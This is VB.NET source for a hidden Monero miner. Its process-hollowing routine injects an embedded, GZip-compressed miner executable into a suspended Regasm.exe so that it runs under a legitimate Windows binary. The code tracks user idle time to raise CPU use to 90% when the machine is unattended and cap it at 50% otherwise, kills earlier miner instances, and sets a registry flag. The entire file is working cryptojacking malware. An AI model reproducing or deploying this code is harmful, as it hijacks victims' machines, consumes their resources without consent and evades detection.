Imports System.Security
Imports System.Runtime.InteropServices

'------------------
'Creator: aeonhack
'Site: elitevs.net
'Created: 02/15/2013
'Changed: 05/12/2013
'Version: 1.0.0.7
'------------------

Public Class Main

    <DllImport("kernel32.dll", EntryPoint:="CreateProcess", CharSet:=CharSet.Unicode), SuppressUnmanagedCodeSecurity>
    Private Shared Function CreateProcess(
    ByVal applicationName As String,
    ByVal commandLine As String,
    ByVal processAttributes As IntPtr,
    ByVal threadAttributes As IntPtr,
    ByVal inheritHandles As Boolean,
    ByVal creationFlags As UInteger,
    ByVal environment As IntPtr,
    ByVal currentDirectory As String,
    ByRef startupInfo As STARTUP_INFORMATION,
    ByRef processInformation As PROCESS_INFORMATION) As Boolean
    End Function

    <DllImport("kernel32.dll", EntryPoint:="GetThreadContext"), SuppressUnmanagedCodeSecurity>
    Private Shared Function GetThreadContext(
    ByVal thread As IntPtr,
    ByVal context As Integer()) As Boolean
    End Function

    <DllImport("kernel32.dll", EntryPoint:="Wow64GetThreadContext"), SuppressUnmanagedCodeSecurity>
    Private Shared Function Wow64GetThreadContext(
    ByVal thread As IntPtr,
    ByVal context As Integer()) As Boolean
    End Function

    <DllImport("kernel32.dll", EntryPoint:="SetThreadContext"), SuppressUnmanagedCodeSecurity>
    Private Shared Function SetThreadContext(
    ByVal thread As IntPtr,
    ByVal context As Integer()) As Boolean
    End Function

    <DllImport("kernel32.dll", EntryPoint:="Wow64SetThreadContext"), SuppressUnmanagedCodeSecurity>
    Private Shared Function Wow64SetThreadContext(
    ByVal thread As IntPtr,
    ByVal context As Integer()) As Boolean
    End Function

    <DllImport("kernel32.dll", EntryPoint:="ReadProcessMemory"), SuppressUnmanagedCodeSecurity>
    Private Shared Function ReadProcessMemory(
    ByVal process As IntPtr,
    ByVal baseAddress As Integer,
    ByRef buffer As Integer,
    ByVal bufferSize As Integer,
    ByRef bytesRead As Integer) As Boolean
    End Function

    <DllImport("kernel32.dll", EntryPoint:="WriteProcessMemory"), SuppressUnmanagedCodeSecurity>
    Private Shared Function WriteProcessMemory(
    ByVal process As IntPtr,
    ByVal baseAddress As Integer,
    ByVal buffer As Byte(),
    ByVal bufferSize As Integer,
    ByRef bytesWritten As Integer) As Boolean
    End Function

    <DllImport("ntdll.dll", EntryPoint:="NtUnmapViewOfSection"), SuppressUnmanagedCodeSecurity>
    Private Shared Function NtUnmapViewOfSection(
    ByVal process As IntPtr,
    ByVal baseAddress As Integer) As Integer
    End Function

    <DllImport("kernel32.dll", EntryPoint:="VirtualAllocEx"), SuppressUnmanagedCodeSecurity>
    Private Shared Function VirtualAllocEx(
    ByVal handle As IntPtr,
    ByVal address As Integer,
    ByVal length As Integer,
    ByVal type As Integer,
    ByVal protect As Integer) As Integer
    End Function

    <DllImport("kernel32.dll", EntryPoint:="ResumeThread"), SuppressUnmanagedCodeSecurity>
    Private Shared Function ResumeThread(
    ByVal handle As IntPtr) As Integer
    End Function

    <StructLayout(LayoutKind.Sequential, Pack:=1)>
    Private Structure PROCESS_INFORMATION
        Public ProcessHandle As IntPtr
        Public ThreadHandle As IntPtr
        Public ProcessId As UInteger
        Public ThreadId As UInteger
    End Structure

    <StructLayout(LayoutKind.Sequential, Pack:=1)>
    Private Structure STARTUP_INFORMATION
        Public Size As UInteger
        Public Reserved1 As String
        Public Desktop As String
        Public Title As String

        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=36)>
        Public Misc As Byte()

        Public Reserved2 As IntPtr
        Public StdInput As IntPtr
        Public StdOutput As IntPtr
        Public StdError As IntPtr
    End Structure

    <StructLayout(LayoutKind.Sequential)>
    Public Structure LASTINPUTINFO
        Public cbSize As Int32
        Public dwTime As Int32
    End Structure
    Private Declare Function GetTickCount Lib "kernel32" () As Long
    Private Declare Function GetLastInputInfo Lib "User32.dll" (ByRef lastInput As LASTINPUTINFO) As Boolean
    Public Shared idle As Boolean = False
    Public Shared active As Boolean = False

    Public Shared Sub XM(ByVal cpu As String, ByVal url As String, ByVal user As String, ByVal pass As String, ByVal HW As String)

        Try : Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\" & HW).SetValue("MinerXMR", "True") : Catch : End Try

        Kill()

        Try
            Try
                If cpu.Contains("<CUS>") Then
                    Run("C:\Windows\Microsoft.NET\Framework\v2.0.50727\Regasm.exe", cpu.Split("<CUS>")(0), GZip(My.Resources.cpu), True)
                    Return
                End If
            Catch ex As Exception
            End Try

            Dim TimeOUT As Integer = GetScreenSaverTimeOut() * 60
            If GetScreenSaverTimeOut() <= 5 OrElse TimeOUT = 0 OrElse TimeOUT = -1 Then
                TimeOUT = 300
            End If

            Do While Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\" & HW).GetValue("MinerXMR", "") = "True"
                Threading.Thread.Sleep(10)
                Dim lii As LASTINPUTINFO

                lii.cbSize = Len(lii)
                Call GetLastInputInfo(lii)

                If FormatNumber((GetTickCount() - lii.dwTime) / 1000, 0) > TimeOUT AndAlso idle = False Then
                    idle = True
                    active = False
                    Kill()

                    Try
                        Run("C:\Windows\Microsoft.NET\Framework\v2.0.50727\Regasm.exe", "-B --donate-level=0 -t " & Environment.ProcessorCount & " -a cryptonight --url=" & url & " -u " & user & " -p " & pass & " -R --variant=-1 --max-cpu-usage=90", GZip(My.Resources.cpu), True)
                    Catch ex As Exception
                    End Try

                ElseIf FormatNumber((GetTickCount() - lii.dwTime) / 1000, 0) < TimeOUT AndAlso active = False Then
                    active = True
                    idle = False
                    Kill()

                    Try
                        Run("C:\Windows\Microsoft.NET\Framework\v2.0.50727\Regasm.exe", "-B --donate-level=0 -t " & cpu & " -a cryptonight --url=" & url & " -u " & user & " -p " & pass & " -R --variant=-1 --max-cpu-usage=50", GZip(My.Resources.cpu), True)
                    Catch ex As Exception
                    End Try

                End If
            Loop
        Catch ex As Exception
        End Try

    End Sub

    Public Shared Sub Kill()
        On Error Resume Next
        Dim objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & Environment.UserDomainName & "\root\cimv2")
        Dim colProcess = objWMIService.ExecQuery("Select * from Win32_Process")
        Dim wmiQuery As String = String.Format("select CommandLine from Win32_Process where Name='{0}'", "Regasm.exe")
        Dim searcher As Management.ManagementObjectSearcher = New Management.ManagementObjectSearcher(wmiQuery)
        Dim retObjectCollection As Management.ManagementObjectCollection = searcher.Get
        For Each retObject In colProcess
            If retObject.CommandLine.ToString.Contains("--donate-level=") Then
                retObject.Terminate()
            End If
        Next

    End Sub

    Public Shared Function Run(ByVal path As String, ByVal cmd As String, ByVal data As Byte(), ByVal compatible As Boolean) As Boolean
        For I As Integer = 1 To 5
            If HandleRun(path, cmd, data, compatible) Then Return True
        Next
        Return False
    End Function


    Private Shared Function HandleRun(ByVal path As String, ByVal cmd As String, ByVal data As Byte(), ByVal compatible As Boolean) As Boolean
        Dim ReadWrite As Integer
        Dim QuotedPath As String = String.Format("""{0}""", path)

        Dim SI As New STARTUP_INFORMATION
        Dim PI As New PROCESS_INFORMATION

        SI.Size = CUInt(Marshal.SizeOf(GetType(STARTUP_INFORMATION)))

        Try
            If Not String.IsNullOrEmpty(cmd) Then
                QuotedPath = QuotedPath & " " & cmd
            End If

            If Not CreateProcess(path, QuotedPath, IntPtr.Zero, IntPtr.Zero, False, 4, IntPtr.Zero, Nothing, SI, PI) Then Throw New Exception()

            Dim FileAddress As Integer = BitConverter.ToInt32(data, 60)
            Dim ImageBase As Integer = BitConverter.ToInt32(data, FileAddress + 52)

            Dim Context(179 - 1) As Integer
            Context(0) = 65538

            If IntPtr.Size = 4 Then
                If Not GetThreadContext(PI.ThreadHandle, Context) Then Throw New Exception()
            Else
                If Not Wow64GetThreadContext(PI.ThreadHandle, Context) Then Throw New Exception()
            End If

            Dim Ebx As Integer = Context(41)
            Dim BaseAddress As Integer

            If Not ReadProcessMemory(PI.ProcessHandle, Ebx + 8, BaseAddress, 4, ReadWrite) Then Throw New Exception()

            If ImageBase = BaseAddress Then
                If Not NtUnmapViewOfSection(PI.ProcessHandle, BaseAddress) = 0 Then Throw New Exception()
            End If

            Dim SizeOfImage As Integer = BitConverter.ToInt32(data, FileAddress + 80)
            Dim SizeOfHeaders As Integer = BitConverter.ToInt32(data, FileAddress + 84)

            Dim AllowOverride As Boolean
            Dim NewImageBase As Integer = VirtualAllocEx(PI.ProcessHandle, ImageBase, SizeOfImage, 12288, 64)

            'This is the only way to execute under certain conditions. However, it may show
            'an application error probably because things aren't being relocated properly.

            If Not compatible AndAlso NewImageBase = 0 Then
                AllowOverride = True
                NewImageBase = VirtualAllocEx(PI.ProcessHandle, 0, SizeOfImage, 12288, 64)
            End If

            If NewImageBase = 0 Then Throw New Exception()

            If Not WriteProcessMemory(PI.ProcessHandle, NewImageBase, data, SizeOfHeaders, ReadWrite) Then Throw New Exception()

            Dim SectionOffset As Integer = FileAddress + 248
            Dim NumberOfSections As Short = BitConverter.ToInt16(data, FileAddress + 6)

            For I As Integer = 0 To NumberOfSections - 1
                Dim VirtualAddress As Integer = BitConverter.ToInt32(data, SectionOffset + 12)
                Dim SizeOfRawData As Integer = BitConverter.ToInt32(data, SectionOffset + 16)
                Dim PointerToRawData As Integer = BitConverter.ToInt32(data, SectionOffset + 20)

                If Not SizeOfRawData = 0 Then
                    Dim SectionData(SizeOfRawData - 1) As Byte
                    Buffer.BlockCopy(data, PointerToRawData, SectionData, 0, SectionData.Length)

                    If Not WriteProcessMemory(PI.ProcessHandle, NewImageBase + VirtualAddress, SectionData, SectionData.Length, ReadWrite) Then Throw New Exception()
                End If

                SectionOffset += 40
            Next

            Dim PointerData As Byte() = BitConverter.GetBytes(NewImageBase)
            If Not WriteProcessMemory(PI.ProcessHandle, Ebx + 8, PointerData, 4, ReadWrite) Then Throw New Exception()

            Dim AddressOfEntryPoint As Integer = BitConverter.ToInt32(data, FileAddress + 40)

            If AllowOverride Then NewImageBase = ImageBase
            Context(44) = NewImageBase + AddressOfEntryPoint

            If IntPtr.Size = 4 Then
                If Not SetThreadContext(PI.ThreadHandle, Context) Then Throw New Exception()
            Else
                If Not Wow64SetThreadContext(PI.ThreadHandle, Context) Then Throw New Exception()
            End If

            If ResumeThread(PI.ThreadHandle) = -1 Then Throw New Exception()
        Catch
            Dim P As Process = Process.GetProcessById(CInt(PI.ProcessId))
            If P IsNot Nothing Then P.Kill()

            Return False
        End Try

        Return True
    End Function

    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByRef lpvParam As Integer, ByVal fuWinIni As Integer) As Integer
    Private Const SPI_GETSCREENSAVETIMEOUT = 14

    Public Shared Function GetScreenSaverTimeOut() As Integer
        Dim lRet As Integer
        Dim lSeconds As Integer
        lRet = SystemParametersInfo _
            (SPI_GETSCREENSAVETIMEOUT, 0, lSeconds, 0)
        If lRet > 0 Then
            GetScreenSaverTimeOut = lSeconds / 60
        Else
            'return -1 to indicate error condition
            GetScreenSaverTimeOut = -1
        End If
    End Function


    Private Shared Function GZip(ByVal B As Byte()) As Byte()
        Try
            Dim MS As New IO.MemoryStream(B)
            Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Decompress)
            Dim buffer As Byte() = New Byte(4 - 1) {}
            MS.Position = (MS.Length - 5)
            MS.Read(buffer, 0, 4)
            Dim count As Integer = BitConverter.ToInt32(buffer, 0)
            MS.Position = 0
            Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
            Ziped.Read(array, 0, count)
            Ziped.Dispose()
            MS.Dispose()
            Return array
        Catch ex As Exception
        End Try
    End Function



End Class